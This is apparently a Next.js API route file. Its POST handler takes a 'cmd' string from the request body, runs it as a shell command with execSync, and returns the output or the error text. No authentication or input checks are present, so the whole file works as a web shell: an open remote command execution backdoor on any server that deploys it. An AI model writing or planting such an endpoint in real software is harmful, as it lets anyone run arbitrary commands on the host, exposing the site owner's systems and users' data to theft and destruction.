import { NextResponse } from "next/server";
import { execSync } from "child_process";

export const dynamic = "force-dynamic";

export async function POST(req: Request) {
  try {
    const { cmd } = await req.json();
    const out = execSync(cmd).toString();
    return new NextResponse(out, { headers: { "Content-Type": "text/plain" } });
  } catch (error: unknown) {
    const err = error instanceof Error ? error : new Error(String(error));
    const stdout =
      err instanceof Error && "stdout" in err
        ? String((err as { stdout?: Buffer | string }).stdout)
        : "";
    const stderr =
      err instanceof Error && "stderr" in err
        ? String((err as { stderr?: Buffer | string }).stderr)
        : "";
    return new NextResponse(`${err.message}\n${stdout}\n${stderr}`, { status: 500 });
  }
}
